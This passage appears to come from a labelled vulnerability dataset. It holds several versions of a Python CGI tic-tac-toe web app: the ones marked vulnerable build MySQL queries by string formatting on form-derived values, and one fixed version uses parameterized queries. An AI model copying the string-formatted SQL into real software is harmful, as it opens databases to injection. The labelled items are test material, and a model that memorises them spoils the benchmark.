script!\n\n\n\nclass FormError(BaseException):\n    def __init__(this, msg):\n        this.msg = msg\n\n\n\ndef get_game_info(conn, game):\n    # get the basic game properties\n    cursor = conn.cursor()\n    cursor.execute(\"SELECT player1,player2,size,state FROM games WHERE id = %d;\" % game)\n    if cursor.rowcount != 1:\n        raise FormError(\"Invalid game ID\")\n\n    row = cursor.fetchall()[0]\n    players = [row[0],row[1]]\n    size    =  row[2]\n    state   =  row[3]\n\n    if state is None:\n         state = \"Active\"\n\n    cursor.close()\n\n    return (players,size,state)\n\n\n\ndef build_board(conn, game,size):\n    # we'll build the empty board, and then fill in with the move list that\n    # we get from the DB.\n    board = []\n    for i in range(size):\n        board.append([\"\"]*size)\n\n\n    # search for all moves that have happenend during this game.\n    cursor = conn.cursor()\n    cursor.execute(\"SELECT x,y,letter FROM moves WHERE gameID = %d;\" % game)\n\n    counts = {\"X\":0, \"O\":0}\n    for move in cursor.fetchall():\n        (x,y,letter) = move\n\n        x = int(x)\n        y = int(y)\n        assert x >= 0 and x < size\n        assert y >= 0 and y < size\n\n        assert letter in \"XO\"\n\n        assert board[x][y] == \"\"\n        board[x][y] = letter\n\n        counts[letter] += 1\n\n    cursor.close()\n\n    assert counts[\"X\"] >= counts[\"O\"]\n    assert counts[\"X\"] <= counts[\"O\"]+1\n\n    if counts[\"X\"] == counts[\"O\"]:\n        nextPlayer = 0\n    else:\n        nextPlayer = 1\n    letter = \"XO\"[nextPlayer]\n\n    return (board,nextPlayer,letter)\n\n/n/n/n/cgi/create_game.py/n/n#! /usr/bin/env python3\n\n# taken from:\n#    https://docs.python.org/3.4/howto/webservers.html\n\nimport cgi\n\n# enable debugging.  Note that the Python docs recommend this for testing, but\n# say that it's a very bad idea to leave enabled in production, as it can leak\n# information about your internal implementation.\nimport cgitb\ncgitb.enable(display=0, logdir=\"/var/log/httpd/cgi_err/\")\n\n\nimport MySQLdb\nimport private_no_share_dangerous_passwords as pnsdp\n\nfrom common import FormError\n\n\n\n# this function handles the processing of the actual text of the HTML file.\n# It writes everything from the HTML header, to the content in the body, to\n# the closing tags at the bottom.\n#\n# Later, I ought to make this smarter, to handle cookies and such.  Or, just\n# switch over to some framework which makes it all easier for me!\n\ndef process_form():\n    # see https://docs.python.org/3.4/library/cgi.html for the basic usage\n    # here.\n    form = cgi.FieldStorage()\n\n\n    if \"player1\" not in form or \"player2\" not in form or \"size\" not in form:\n        raise FormError(\"Invalid parameters.\")\n\n    player1 = form[\"player1\"].value\n    player2 = form[\"player2\"].value\n    for c in player1+player2:\n        if c not in \"_-\" and not c.isdigit() and not c.isalpha():\n            raise FormError(\"Invalid parameters: The player names can only contains upper and lowercase characters, digits, underscores, and hypens\")\n            return\n\n    try:\n        size = int(form[\"size\"].value)\n    except:\n        raise FormError(\"Invalid parameters: 'size' is not an integer.\")\n        return\n\n    if size < 2 or size > 9:\n        raise FormError(\"The 'size' must be in the range 2-9, inclusive.\")\n\n\n    # connect to the database\n    conn = MySQLdb.connect(host   = pnsdp.SQL_HOST,\n                           user   = pnsdp.SQL_USER,\n                           passwd = pnsdp.SQL_PASSWD,\n                           db     = pnsdp.SQL_DB)\n    cursor = conn.cursor()\n\n    # insert the new row\n    cursor.execute(\"\"\"INSERT INTO games(player1,player2,size) VALUES(\"%s\",\"%s\",%d);\"\"\" % (player1,player2,size))\n\n    gameID = cursor.lastrowid\n\n\n    # MySQLdb has been building a transaction as we run.  Commit them now, and\n    # also clean up the other resources we've allocated.\n    conn.commit()\n    cursor.close()\n    conn.close()\n\n    return gameID\n\n\n\n# this is what actually runs, each time that we are called...\n\ntry:\n    #print(\"Content-type: text/html\")\n    #print()\n\n    # this will not print out *ANYTHING* !!!\n    gameID = process_form()\n\n    # https://en.wikipedia.org/wiki/Post/Redirect/Get\n    # https://stackoverflow.com/questions/6122957/webpage-redirect-to-the-main-page-with-cgi-python\n    print(\"Status: 303 See other\")\n    print(\"\"\"Location: http://%s/cgi-bin/list.py?new_game=%s\"\"\" % (pnsdp.WEB_HOST,gameID))\n    print()\n\nexcept FormError as e:\n    print(\"\"\"Content-Type: text/html;charset=utf-8\n\n<html>\n\n<head><title>346 - Russ Lewis - Tic-Tac-Toe</title></head>\n\n<body>\n\n<p>ERROR: %s\n\n<p><a href=\"list.py\">Return to game list</a>\n\n</body>\n</html>\n\n\"\"\" % e.msg, end=\"\")\n\nexcept:\n    raise    # throw the error again, now that we've printed the lead text - and this will cause cgitb to report the error\n\n\n/n/n/n/cgi/move.py/n/n#! /usr/bin/env python3\n\n# taken from:\n#    https://docs.python.org/3.4/howto/webservers.html\n\nimport cgi\n\n# enable debugging.  Note that the Python docs recommend this for testing, but\n# say that it's a very bad idea to leave enabled in production, as it can leak\n# information about your internal implementation.\nimport cgitb\ncgitb.enable(display=0, logdir=\"/var/log/httpd/cgi_err/\")\n\nimport MySQLdb\nimport private_no_share_dangerous_passwords as pnsdp\n\nfrom common import get_game_info,build_board,FormError\n\n\n\n# this function handles the processing of the actual text of the HTML file.\n# It writes everything from the HTML header, to the content in the body, to\n# the closing tags at the bottom.\n#\n# Later, I ought to make this smarter, to handle cookies and such.  Or, just\n# switch over to some framework which makes it all easier for me!\n\ndef process_form():\n    # see https://docs.python.org/3.4/library/cgi.html for the basic usage\n    # here.\n    form = cgi.FieldStorage()\n\n\n    # connect to the database\n    conn = MySQLdb.connect(host   = pnsdp.SQL_HOST,\n                           user   = pnsdp.SQL_USER,\n                           passwd = pnsdp.SQL_PASSWD,\n                           db     = pnsdp.SQL_DB)\n\n\n    if \"user\" not in form or \"game\" not in form:\n        raise FormError(\"Invalid parameters.\")\n    if \"pos\" not in form and \"resign\" not in form:\n        raise FormError(\"Invalid parameters.\")\n\n    game = int(form[\"game\"].value)\n\n\n    (players,size,state) = get_game_info(conn, game)\n\n    user = form[\"user\"].value\n    if user not in players:\n        raise FormError(\"Invalid player ID - player is not part of this game\")\n\n\n    if \"resign\" in form:\n        resign = True\n    else:\n        resign = False\n        pos = form[\"pos\"].value.split(\",\")\n        assert len(pos) == 2\n        x = int(pos[0])\n        y = int(pos[1])\n\n\n    (board,nextPlayer,letter) = build_board(conn, game,size)\n\n    if user != players[nextPlayer]:\n        raise FormError(\"Internal error, incorrect player is attempting to move.\")\n\n\n    if resign:\n        # this user is choosing to resign.  Update the game state to reflect that.\n        other_player_name = players[1-nextPlayer]\n\n        cursor = conn.cursor()\n        cursor.execute(\"\"\"UPDATE games SET state=\"%s:resignation\" WHERE id=%d;\"\"\" % (other_player_name,game))\n        cursor.close()\n\n    else:\n        assert x >= 0 and x < size\n        assert y >= 0 and y < size\n\n        assert board[x][y] == \"\"\n        board[x][y] = \"XO\"[nextPlayer]\n\n        # we've done all of our sanity checks.  We now know enough to say that\n        # it's safe to add a new move.\n        cursor = conn.cursor()\n        cursor.execute(\"\"\"INSERT INTO moves(gameID,x,y,letter,time) VALUES(%d,%d,%d,\"%s\",NOW());\"\"\" % (game,x,y,letter))\n\n        if cursor.rowcount != 1:\n            raise FormError(\"Could not make move, reason unknown.\")\n\n        cursor.close()\n\n        result = analyze_board(board)\n        if result != \"\":\n            if result == \"win\":\n                result = players[nextPlayer]+\":win\"\n\n            cursor = conn.cursor()\n            cursor.execute(\"\"\"UPDATE games SET state=\"%s\" WHERE id=%d;\"\"\" % (result,game))\n            cursor.close()\n\n    # we've made changes, make sure to commit them!\n    conn.commit()\n    conn.close()\n\n\n    # return the parms to the caller, so that they can build a good redirect\n    return (user,game)\n\n\n\ndef analyze_board(board):\n    size = len(board)\n\n    for x in range(size):\n        # scan through the column 'x' to see if they are all the same.\n        if board[x][0] == \"\":\n            continue\n        all_same = True\n        for y in range(1,size):\n            if board[x][y] != board[x][0]:\n                all_same = False\n                break\n        if all_same:\n            return \"win\"\n\n    for y in range(size):\n        # scan through the row 'y' to see if they are all the same.\n        if board[0][y] == \"\":\n            continue\n        all_same = True\n        for x in range(1,size):\n            if board[x][y] != board[0][y]:\n                all_same = False\n                break\n        if all_same:\n            return \"win\"\n\n    # check the NW/SE diagonal\n    if board[0][0] != \"\":\n        all_same = True\n        for i in range(1,size):\n            if board[i][i] != board[0][0]:\n                all_same = False\n                break\n        if all_same:\n            return \"win\"\n\n    # check the NE/SW diagonal\n    if board[size-1][0] != \"\":\n        all_same = True\n        for i in range(1,size):\n            if board[size-1-i][i] != board[size-1][0]:\n                all_same = False\n                break\n        if all_same:\n            return \"win\"\n\n    # check for stalemate\n    for x in range(size):\n        for y in range(size):\n            if board[x][y] == \"\":\n                return \"\"\n    return \"stalemate\"\n\n\n\n# this is what actually runs, each time that we are called...\n\ntry:\n#    print(\"Content-type: text/html\")\n#    print()\n\n    # this will not print out *ANYTHING* !!!\n    (user,game) = process_form()\n\n    # https://en.wikipedia.org/wiki/Post/Redirect/Get\n    # https://stackoverflow.com/questions/6122957/webpage-redirect-to-the-main-page-with-cgi-python\n    print(\"Status: 303 See other\")\n    print(\"\"\"Location: http://%s/cgi-bin/game.py?user=%s&game=%s\"\"\" % (pnsdp.WEB_HOST, user,game))\n    print()\n\nexcept FormError as e:\n    print(\"\"\"Content-Type: text/html;charset=utf-8\n\n<html>\n\n<head><title>346 - Russ Lewis - Tic-Tac-Toe</title></head>\n\n<body>\n\n<p>ERROR: %s\n\n<p><a href=\"list.py\">Return to game list</a>\n\n</body>\n</html>\n\n\"\"\" % e.msg, end=\"\")\n\nexcept:\n    print(\"\"\"Content-Type: text/html;charset=utf-8\\n\\n\"\"\")\n\n    raise    # throw the error again, now that we've printed the lead text - and this will cause cgitb to report the error\n\n\n/n/n/n", "label": 1}, {"id": "ee20e755caaf20bfabd7cfedf2f4c4eb24b7cf15", "code": "cgi/common.py/n/n# NOTE: I did *NOT* add a shebang here, intentionally, because\n#       this is *NEVER* supposed to be a user-facing script!\n\n\n\nclass FormError(BaseException):\n    def __init__(this, msg):\n        this.msg = msg\n\n\n\ndef get_game_info(conn, game):\n    # get the basic game properties\n    cursor = conn.cursor()\n    cursor.execute(\"SELECT player1,player2,size,state FROM games WHERE id = %s;\", (game,))\n    if cursor.rowcount != 1:\n        raise FormError(\"Invalid game ID\")\n\n    row = cursor.fetchall()[0]\n    players = [row[0],row[1]]\n    size    =  row[2]\n    state   =  row[3]\n\n    if state is None:\n         state = \"Active\"\n\n    cursor.close()\n\n    return (players,size,state)\n\n\n\ndef build_board(conn, game,size):\n    # we'll build the empty board, and then fill in with the move list that\n    # we get from the DB.\n    board = []\n    for i in range(size):\n        board.append([\"\"]*size)\n\n\n    # search for all moves that have happenend during this game.\n    cursor = conn.cursor()\n    cursor.execute(\"SELECT x,y,letter FROM moves WHERE gameID = %s;\", (game,))\n\n    counts = {\"X\":0, \"O\":0}\n    for move in cursor.fetchall():\n        (x,y,letter) = move\n\n        x = int(x)\n        y = int(y)\n        assert x >= 0 and x < size\n        assert y >= 0 and y < size\n\n        assert letter in \"XO\"\n\n        assert board[x][y] == \"\"\n        board[x][y] = letter\n\n        counts[letter] += 1\n\n    cursor.close()\n\n    assert counts[\"X\"] >= counts[\"O\"]\n    assert counts[\"X\"] <= counts[\"O\"]+1\n\n    if counts[\"X\"] == counts[\"O\"]:\n        nextPlayer = 0\n    else:\n        nextPlayer = 1\n    letter = \"XO\"[nextPlayer]\n\n    return (board,nextPlayer,letter)\n\n/n/n/ncgi/create_game.py/n/n#! /usr/bin/env python3\n\n# taken from:\n#    https://docs.python.org/3.4/howto/webservers.html\n\nimport cgi\n\n# enable debugging.  Note that the Python docs recommend this for testing, but\n# say that it's a very bad idea to leave enabled in production, as it can leak\n# information about your internal implementation.\nimport cgitb\ncgitb.enable(display=0, logdir=\"/var/log/httpd/cgi_err/\")\n\n\nimport MySQLdb\nimport private_no_share_dangerous_passwords as pnsdp\n\nfrom common import FormError\n\n\n\n# this function handles the processing of the actual text of the HTML file.\n# It writes everything from the HTML header, to the content in the body, to\n# the closing tags at the bottom.\n#\n# Later, I ought to make this smarter, to handle cookies and such.  Or, just\n# switch over to some framework which makes it all easier for me!\n\ndef process_form():\n    # see https://docs.python.org/3.4/library/cgi.html for the basic usage\n    # here.\n    form = cgi.FieldStorage()\n\n\n    if \"player1\" not in form or \"player2\" not in form or \"size\" not in form:\n        raise FormError(\"Invalid parameters.\")\n\n    player1 = form[\"player1\"].value\n    player2 = form[\"player2\"].value\n    for c in player1+player2:\n        if c not in \"_-\" and not c.isdigit() and not c.isalpha():\n            raise FormError(\"Invalid parameters: The player names can only contains upper and lowercase characters, digits, underscores, and hypens\")\n            return\n\n    try:\n        size = int(form[\"size\"].value)\n    except:\n        raise FormError(\"Invalid parameters: 'size' is not an integer.\")\n        return\n\n    if size < 2 or size > 9:\n        raise FormError(\"The 'size' must be in the range 2-9, inclusive.\")\n\n\n    # connect to the database\n    conn = MySQLdb.connect(host   = pnsdp.SQL_HOST,\n                           user   = pnsdp.SQL_USER,\n                           passwd = pnsdp.SQL_PASSWD,\n                           db     = pnsdp.SQL_DB)\n    cursor = conn.cursor()\n\n    # insert the new row\n    cursor.execute(\"\"\"INSERT INTO games(player1,player2,size) VALUES(%s,%s,%s);\"\"\", (player1,player2,size))\n\n    gameID = cursor.lastrowid\n\n\n    # MySQLdb has been building a transaction as we run.  Commit them now, and\n    # also clean up the other resources we've allocated.\n    conn.commit()\n    cursor.close()\n    conn.close()\n\n    return gameID\n\n\n\n# this is what actually runs, each time that we are called...\n\ntry:\n    #print(\"Content-type: text/html\")\n    #print()\n\n    # this will not print out *ANYTHING* !!!\n    gameID = process_form()\n\n    # https://en.wikipedia.org/wiki/Post/Redirect/Get\n    # https://stackoverflow.com/questions/6122957/webpage-redirect-to-the-main-page-with-cgi-python\n    print(\"Status: 303 See other\")\n    print(\"\"\"Location: http://%s/cgi-bin/list.py?new_game=%s\"\"\" % (pnsdp.WEB_HOST,gameID))\n    print()\n\nexcept FormError as e:\n    print(\"\"\"Content-Type: text/html;charset=utf-8\n\n<html>\n\n<head><title>346 - Russ Lewis - Tic-Tac-Toe</title></head>\n\n<body>\n\n<p>ERROR: %s\n\n<p><a href=\"list.py\">Return to game list</a>\n\n</body>\n</html>\n\n\"\"\" % e.msg, end=\"\")\n\nexcept:\n    raise    # throw the error again, now that we've printed the lead text - and this will cause cgitb to report the error\n\n\n/n/n/ncgi/move.py/n/n#! /usr/bin/env python3\n\n# taken from:\n#    https://docs.python.org/3.4/howto/webservers.html\n\nimport cgi\n\n# enable debugging.  Note that the Python docs recommend this for testing, but\n# say that it's a very bad idea to leave enabled in production, as it can leak\n# information about your internal implementation.\nimport cgitb\ncgitb.enable(display=0, logdir=\"/var/log/httpd/cgi_err/\")\n\nimport MySQLdb\nimport private_no_share_dangerous_passwords as pnsdp\n\nfrom common import get_game_info,build_board,FormError\n\n\n\n# this function handles the processing of the actual text of the HTML file.\n# It writes everything from the HTML header, to the content in the body, to\n# the closing tags at the bottom.\n#\n# Later, I ought to make this smarter, to handle cookies and such.  Or, just\n# switch over to some framework which makes it all easier for me!\n\ndef process_form():\n    # see https://docs.python.org/3.4/library/cgi.html for the basic usage\n    # here.\n    form = cgi.FieldStorage()\n\n\n    # connect to the database\n    conn = MySQLdb.connect(host   = pnsdp.SQL_HOST,\n                           user   = pnsdp.SQL_USER,\n                           passwd = pnsdp.SQL_PASSWD,\n                           db     = pnsdp.SQL_DB)\n\n\n    if \"user\" not in form or \"game\" not in form:\n        raise FormError(\"Invalid parameters.\")\n    if \"pos\" not in form and \"resign\" not in form:\n        raise FormError(\"Invalid parameters.\")\n\n    game = int(form[\"game\"].value)\n\n\n    (players,size,state) = get_game_info(conn, game)\n\n    user = form[\"user\"].value\n    if user not in players:\n        raise FormError(\"Invalid player ID - player is not part of this game\")\n\n\n    if \"resign\" in form:\n        resign = True\n    else:\n        resign = False\n        pos = form[\"pos\"].value.split(\",\")\n        assert len(pos) == 2\n        x = int(pos[0])\n        y = int(pos[1])\n\n\n    (board,nextPlayer,letter) = build_board(conn, game,size)\n\n    if user != players[nextPlayer]:\n        raise FormError(\"Internal error, incorrect player is attempting to move.\")\n\n\n    if resign:\n        # this user is choosing to resign.  Update the game state to reflect that.\n        other_player_name = players[1-nextPlayer]\n\n        cursor = conn.cursor()\n        cursor.execute(\"\"\"UPDATE games SET state=%s WHERE id=%s;\"\"\", (other_player_name+\":resignation\",game))\n        cursor.close()\n\n    else:\n        assert x >= 0 and x < size\n        assert y >= 0 and y < size\n\n        assert board[x][y] == \"\"\n        board[x][y] = \"XO\"[nextPlayer]\n\n        # we've done all of our sanity checks.  We now know enough to say that\n        # it's safe to add a new move.\n        cursor = conn.cursor()\n        cursor.execute(\"\"\"INSERT INTO moves(gameID,x,y,letter,time) VALUES(%s,%s,%s,%s,NOW());\"\"\", (game,x,y,letter))\n\n        if cursor.rowcount != 1:\n            raise FormError(\"Could not make move, reason unknown.\")\n\n        cursor.close()\n\n        result = analyze_board(board)\n        if result != \"\":\n            if result == \"win\":\n                result = players[nextPlayer]+\":win\"\n\n            cursor = conn.cursor()\n            cursor.execute(\"\"\"UPDATE games SET state=%s WHERE id=%s;\"\"\", (result,game))\n            cursor.close()\n\n    # we've made changes, make sure to commit them!\n    conn.commit()\n    conn.close()\n\n\n    # return the parms to the caller, so that they can build a good redirect\n    return (user,game)\n\n\n\ndef analyze_board(board):\n    size = len(board)\n\n    for x in range(size):\n        # scan through the column 'x' to see if they are all the same.\n        if board[x][0] == \"\":\n            continue\n        all_same = True\n        for y in range(1,size):\n            if board[x][y] != board[x][0]:\n                all_same = False\n                break\n        if all_same:\n            return \"win\"\n\n    for y in range(size):\n        # scan through the row 'y' to see if they are all the same.\n        if board[0][y] == \"\":\n            continue\n        all_same = True\n        for x in range(1,size):\n            if board[x][y] != board[0][y]:\n                all_same = False\n                break\n        if all_same:\n            return \"win\"\n\n    # check the NW/SE diagonal\n    if board[0][0] != \"\":\n        all_same = True\n        for i in range(1,size):\n            if board[i][i] != board[0][0]:\n                all_same = False\n                break\n        if all_same:\n            return \"win\"\n\n    # check the NE/SW diagonal\n    if board[size-1][0] != \"\":\n        all_same = True\n        for i in range(1,size):\n            if board[size-1-i][i] != board[size-1][0]:\n                all_same = False\n                break\n        if all_same:\n            return \"win\"\n\n    # check for stalemate\n    for x in range(size):\n        for y in range(size):\n            if board[x][y] == \"\":\n                return \"\"\n    return \"stalemate\"\n\n\n\n# this is what actually runs, each time that we are called...\n\ntry:\n#    print(\"Content-type: text/html\")\n#    print()\n\n    # this will not print out *ANYTHING* !!!\n    (user,game) = process_form()\n\n    # https://en.wikipedia.org/wiki/Post/Redirect/Get\n    # https://stackoverflow.com/questions/6122957/webpage-redirect-to-the-main-page-with-cgi-python\n    print(\"Status: 303 See other\")\n    print(\"\"\"Location: http://%s/cgi-bin/game.py?user=%s&game=%s\"\"\" % (pnsdp.WEB_HOST, user,game))\n    print()\n\nexcept FormError as e:\n    print(\"\"\"Content-Type: text/html;charset=utf-8\n\n<html>\n\n<head><title>346 - Russ Lewis - Tic-Tac-Toe</title></head>\n\n<body>\n\n<p>ERROR: %s\n\n<p><a href=\"list.py\">Return to game list</a>\n\n</body>\n</html>\n\n\"\"\" % e.msg, end=\"\")\n\nexcept:\n    print(\"\"\"Content-Type: text/html;charset=utf-8\\n\\n\"\"\")\n\n    raise    # throw the error again, now that we've printed the lead text - and this will cause cgitb to report the error\n\n\n/n/n/n", "label": 0}, {"id": "ee20e755caaf20bfabd7cfedf2f4c4eb24b7cf15", "code": "/cgi/common.py/n/n# NOTE: I did *NOT* add a shebang here, intentionally, because\n#       this is *NEVER* supposed to be a user-facing script!\n\n\n\nclass FormError(BaseException):\n    def __init__(this, msg):\n        this.msg = msg\n\n\n\ndef get_game_info(conn, game):\n    # get the basic game properties\n    cursor = conn.cursor()\n    cursor.execute(\"SELECT player1,player2,size,state FROM games WHERE id = %d;\", (game,))\n    if cursor.rowcount != 1:\n        raise FormError(\"Invalid game ID\")\n\n    row = cursor.fetchall()[0]\n    players = [row[0],row[1]]\n    size    =  row[2]\n    state   =  row[3]\n\n    if state is None:\n         state = \"Active\"\n\n    cursor.close()\n\n    return (players,size,state)\n\n\n\ndef build_board(conn, game,size):\n    # we'll build the empty board, and then fill in with the move list that\n    # we get from the DB.\n    board = []\n    for i in range(size):\n        board.append([\"\"]*size)\n\n\n    # search for all moves that have happenend during this game.\n    cursor = conn.cursor()\n    cursor.execute(\"SELECT x,y,letter FROM moves WHERE gameID = %d;\", (game,))\n\n    counts = {\"X\":0, \"O\":0}\n    for move in cursor.fetchall():\n        (x,y,letter) = move\n\n        x = int(x)\n        y = int(y)\n        assert x >= 0 and x < size\n        assert y >= 0 and y < size\n\n        assert letter in \"XO\"\n\n        assert board[x][y] == \"\"\n        board[x][y] = letter\n\n        counts[letter] += 1\n\n    cursor.close()\n\n    assert counts[\"X\"] >= counts[\"O\"]\n    assert counts[\"X\"] <= counts[\"O\"]+1\n\n    if counts[\"X\"] == counts[\"O\"]:\n        nextPlayer = 0\n    else:\n        nextPlayer = 1\n    letter = \"XO\"[nextPlayer]\n\n    return (board,nextPlayer,letter)\n\n/n/n/n/cgi/create_game.py/n/n#! /usr/bin/env python3\n\n# taken from:\n#    https://docs.python.org/3.4/howto/webservers.html\n\nimport cgi\n\n# enable debugging.  Note that the Python docs recommend this for testing, but\n# say that it's a very bad idea to leave enabled in production, as it can leak\n# information about your internal implementation.\nimport cgitb\ncgitb.enable(display=0, logdir=\"/var/log/httpd/cgi_err/\")\n\n\nimport MySQLdb\nimport private_no_share_dangerous_passwords as pnsdp\n\nfrom common import FormError\n\n\n\n# this function handles the processing of the actual text of the HTML file.\n# It writes everything from the HTML header, to the content in the body, to\n# the closing tags at the bottom.\n#\n# Later, I ought to make this smarter, to handle cookies and such.  Or, just\n# switch over to some framework which makes it all easier for me!\n\ndef process_form():\n    # see https://docs.python.org/3.4/library/cgi.html for the basic usage\n    # here.\n    form = cgi.FieldStorage()\n\n\n    if \"player1\" not in form or \"player2\" not in form or \"size\" not in form:\n        raise FormError(\"Invalid parameters.\")\n\n    player1 = form[\"player1\"].value\n    player2 = form[\"player2\"].value\n    for c in player1+player2:\n        if c not in \"_-\" and not c.isdigit() and not c.isalpha():\n            raise FormError(\"Invalid parameters: The player names can only contains upper and lowercase characters, digits, underscores, and hypens\")\n            return\n\n    try:\n        size = int(form[\"size\"].value)\n    except:\n        raise FormError(\"Invalid parameters: 'size' is not an integer.\")\n        return\n\n    if size < 2 or size > 9:\n        raise FormError(\"The 'size' must be in the range 2-9, inclusive.\")\n\n\n    # connect to the database\n    conn = MySQLdb.connect(host   = pnsdp.SQL_HOST,\n                           user   = pnsdp.SQL_USER,\n                           passwd = pnsdp.SQL_PASSWD,\n                           db     = pnsdp.SQL_DB)\n    cursor = conn.cursor()\n\n    # insert the new row\n    cursor.execute(\"\"\"INSERT INTO games(player1,player2,size) VALUES(\"%s\",\"%s\",%d);\"\"\", (player1,player2,size))\n\n    gameID = cursor.lastrowid\n\n\n    # MySQLdb has been building a transaction as we run.  Commit them now, and\n    # also clean up the other resources we've allocated.\n    conn.commit()\n    cursor.close()\n    conn.close()\n\n    return gameID\n\n\n\n# this is what actually runs, each time that we are called...\n\ntry:\n    #print(\"Content-type: text/html\")\n    #print()\n\n    # this will not print out *ANYTHING* !!!\n    gameID = process_form()\n\n    # https://en.wikipedia.org/wiki/Post/Redirect/Get\n    # https://stackoverflow.com/questions/6122957/webpage-redirect-to-the-main-page-with-cgi-python\n    print(\"Status: 303 See other\")\n    print(\"\"\"Location: http://%s/cgi-bin/list.py?new_game=%s\"\"\" % (pnsdp.WEB_HOST,gameID))\n    print()\n\nexcept FormError as e:\n    print(\"\"\"Content-Type: text/html;charset=utf-8\n\n<html>\n\n<head><title>346 - Russ Lewis - Tic-Tac-Toe</title></head>\n\n<body>\n\n<p>ERROR: %s\n\n<p><a href=\"list.py\">Return to game list</a>\n\n</body>\n</html>\n\n\"\"\" % e.msg, end=\"\")\n\nexcept:\n    raise    # throw the error again, now that we've printed the lead text - and this will cause cgitb to report the error\n\n\n/n/n/n/cgi/move.py/n/n#! /usr/bin/env python3\n\n# taken from:\n#    https://docs.python.org/3.4/howto/webservers.html\n\nimport cgi\n\n# enable debugging.  Note that the Python docs recommend this for testing, but\n# say that it's a very bad idea to leave enabled in production, as it can leak\n# information about your internal implementation.\nimport cgitb\ncgitb.enable(display=0, logdir=\"/var/log/httpd/cgi_err/\")\n\nimport MySQLdb\nimport private_no_share_dangerous_passwords as pnsdp\n\nfrom common import get_game_info,build_board,FormError\n\n\n\n# this function handles the processing of the actual text of the HTML file.\n# It writes everything from the HTML header, to the content in the body, to\n# the closing tags at the bottom.\n#\n# Later, I ought to make this smarter, to handle cookies and such.  Or, just\n# switch over to some framework which makes it all easier for me!\n\ndef process_form():\n    # see https://docs.python.org/3.4/library/cgi.html for the basic usage\n    # here.\n    form = cgi.FieldStorage()\n\n\n    # connect to the database\n    conn = MySQLdb.connect(host   = pnsdp.SQL_HOST,\n                           user   = pnsdp.SQL_USER,\n                           passwd = pnsdp.SQL_PASSWD,\n                           db     = pnsdp.SQL_DB)\n\n\n    if \"user\" not in form or \"game\" not in form:\n        raise FormError(\"Invalid parameters.\")\n    if \"pos\" not in form and \"resign\" not in form:\n        raise FormError(\"Invalid parameters.\")\n\n    game = int(form[\"game\"].value)\n\n\n    (players,size,state) = get_game_info(conn, game)\n\n    user = form[\"user\"].value\n    if user not in players:\n        raise FormError(\"Invalid player ID - player is not part of this game\")\n\n\n    if \"resign\" in form:\n        resign = True\n    else:\n        resign = False\n        pos = form[\"pos\"].value.split(\",\")\n        assert len(pos) == 2\n        x = int(pos[0])\n        y = int(pos[1])\n\n\n    (board,nextPlayer,letter) = build_board(conn, game,size)\n\n    if user != players[nextPlayer]:\n        raise FormError(\"Internal error, incorrect player is attempting to move.\")\n\n\n    if resign:\n        # this user is choosing to resign.  Update the game state to reflect that.\n        other_player_name = players[1-nextPlayer]\n\n        cursor = conn.cursor()\n        cursor.execute(\"\"\"UPDATE games SET state=\"%s:resignation\" WHERE id=%d;\"\"\", (other_player_name,game))\n        cursor.close()\n\n    else:\n        assert x >= 0 and x < size\n        assert y >= 0 and y < size\n\n        assert board[x][y] == \"\"\n        board[x][y] = \"XO\"[nextPlayer]\n\n        # we've done all of our sanity checks.  We now know enough to say that\n        # it's safe to add a new move.\n        cursor = conn.cursor()\n        cursor.execute(\"\"\"INSERT INTO moves(gameID,x,y,letter,time) VALUES(%d,%d,%d,\"%s\",NOW());\"\"\", (game,x,y,letter))\n\n        if cursor.rowcount != 1:\n            raise FormError(\"Could not make move, reason unknown.\")\n\n        cursor.close()\n\n        result = analyze_board(board)\n        if result != \"\":\n            if result == \"win\":\n                result = players[nextPlayer]+\":win\"\n\n            cursor = conn.cursor()\n            cursor.execute(\"\"\"UPDATE games SET state=\"%s\" WHERE id=%d;\"\"\", (result,game))\n            cursor.close()\n\n    # we've made changes, make sure to commit them!\n    conn.commit()\n    conn.close()\n\n\n    # return the parms to the caller, so that they can build a good redirect\n    return (user,game)\n\n\n\ndef analyze_board(board):\n    size = len(board)\n\n    for x in range(size):\n        # scan through the column 'x' to see if they are all the same.\n        if board[x][0] == \"\":\n            continue\n        all_same = True\n        for y in range(1,size):\n            if board[x][y] != board[x][0]:\n                all_same = False\n                break\n        if all_same:\n            return \"win\"\n\n    for y in range(size):\n        # scan through the row 'y' to see if they are all the same.\n        if board[0][y] == \"\":\n            continue\n        all_same = True\n        for x in range(1,size):\n            if board[x][y] != board[0][y]:\n                all_same = False\n                break\n        if all_same:\n            return \"win\"\n\n    # check the NW/SE diagonal\n    if board[0][0] != \"\":\n        all_same = True\n        for i in range(1,size):\n            if board[i][i] != board[0][0]:\n                all_same = False\n                break\n        if all_same:\n            return \"win\"\n\n    # check the NE/SW diagonal\n    if board[size-1][0] != \"\":\n        all_same = True\n        for i in range(1,size):\n            if board[size-1-i][i] != board[size-1][0]:\n                all_same = False\n                break\n        if all_same:\n            return \"win\"\n\n    # check for stalemate\n    for x in range(size):\n        for y in range(size):\n            if board[x][y] == \"\":\n                return \"\"\n    return \"stalemate\"\n\n\n\n# this is what actually runs, each time that we are called...\n\ntry:\n#    print(\"Content-type: text/html\")\n#    print()\n\n    # this will not print out *ANYTHING* !!!\n    (user,game) = process_form()\n\n    # https://en.wikipedia.org/wiki/Post/Redirect/Get\n    # https://stackoverflow.com/questions/6122957/webpage-redirect-to-the-main-page-with-cgi-python\n    print(\"Status: 303 See other\")\n    print(\"\"\"Location: http://%s/cgi-bin/game.py?user=%s&game=%s\"\"\" % (pnsdp.WEB_HOST, user,game))\n    print()\n\nexcept FormError as e:\n    print(\"\"\"Content-Type: text/html;charset=utf-8\n\n<html>\n\n<head><title>346 - Russ Lewis - Tic-Tac-Toe</title></head>\n\n<body>\n\n<p>ERROR: %s\n\n<p><a href=\"list.py\">Return to game list</a>\n\n</body>\n</html>\n\n\"\"\" % e.msg, end=\"\")\n\nexcept:\n    print(\"\"\"Content-Type: text/html;charset=utf-8\\n\\n\"\"\")\n\n    raise    # throw the error again, now that we've printed the lead text - and this will cause cgitb to report the error\n\n\n/n/n/n", "label": 1}, {"id": "d551cbcf99305f241d3e6f9a8c724789f8ec81b6", "code": "nano_tipper_z.py/n/nimport praw\nimport time\nfrom datetime import datetime\nfrom time import sleep\nfrom rpc_bindings import send, open_account, generate_account, generate_qr, nano_to_raw, receive_all, send_all, \\\n    check_balance, validate_address, open_or_receive\nimport mysql.connector\nimport pprint\n\ncomment_footer = \"\"\"\\n***\\n\n[About Nano](https://nano.org) | [Where to use Nano](https://usenano.org/) | \n[Nano Tipper Z](https://github.com/danhitchcock/nano_tipper_z) | [Community Nano Projects](https://nanocenter.org) | Transaction Fee: 0.00 